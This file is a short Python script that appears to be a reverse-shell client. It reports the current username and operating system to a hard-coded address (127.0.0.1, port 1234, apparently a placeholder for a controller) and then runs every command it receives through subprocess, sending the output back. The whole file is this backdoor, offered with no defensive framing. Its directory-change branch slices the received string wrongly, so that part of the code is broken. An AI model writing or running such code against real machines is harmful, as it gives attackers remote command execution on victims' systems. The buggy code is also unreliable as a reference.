import os
from socket import *
from getpass import getuser
import subprocess
import platform


get_os = platform.uname()[0]
get_user = getuser()
os_info = "client_name : "+str(get_user)+" <-> "+"client_os : "+str(get_os)

ip = "127.0.0.1"
port = 1234
connection = socket(AF_INET, SOCK_STREAM)
connection.connect((ip, port))

connection.send(os_info.encode())

while True:
    recever = connection.recv(1024).decode()

    if recever == "exit":
        exit()
    elif recever[:2] == "cd":
        os.chdir(recever[:3])
        connection.send(os.getcwd().encode())
    else:
        out_put = subprocess.getoutput(recever)

        if out_put == "" or out_put == None:
            out_put = "erreur"
            connection.send(out_put.encode())
        else:
            connection.send(out_put.encode())
